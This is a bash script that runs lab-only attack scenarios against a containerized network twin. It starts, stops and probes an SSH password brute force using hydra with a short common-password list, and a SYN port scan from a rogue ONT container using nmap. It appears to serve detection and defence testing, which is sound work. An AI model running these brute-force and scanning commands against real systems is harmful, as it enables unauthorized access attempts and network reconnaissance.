#!/usr/bin/env bash
# Lab-only attack scenarios against the twin (Slice 3).  usage: run.sh T1110|T1046 start|stop|probe
set -uo pipefail
P=clab-ft-core
case "$1:$2" in
  T1110:start)  # SSH brute force from the attacker network on ont2's management SSH, in rounds
    docker exec -d $P-atk sh -c 'printf "123456\npassword\nqwerty\nletmein\nroot\n" > /tmp/pw
      for i in $(seq 1 60); do hydra -l admin -P /tmp/pw -t 2 ssh://100.64.10.12 >> /tmp/hydra.log 2>&1; sleep 2; done' ;;
  T1110:stop)   docker exec $P-atk pkill -f "seq 1 60"; docker exec $P-atk pkill hydra; true ;;
  T1110:probe)  docker exec $P-atk sh -c 'timeout 3 nc -z 100.64.10.12 22 && echo reachable || echo blocked' ;;
  T1046:start)  # rogue ONT (ont4) SYN-scans its neighbours, in rounds
    docker exec -d $P-ont4 sh -c 'for i in $(seq 1 60); do nmap -sS -T4 -p 1-200 100.64.10.11-13 >> /tmp/nmap.log 2>&1; sleep 3; done' ;;
  T1046:stop)   docker exec $P-ont4 pkill -f "seq 1 60"; docker exec $P-ont4 pkill nmap; true ;;
  T1046:probe)  docker exec $P-ont4 sh -c 'timeout 3 nc -z 100.64.10.11 22 && echo reachable || echo blocked' ;;
  *) echo "usage: run.sh T1110|T1046 start|stop|probe"; exit 2 ;;
esac
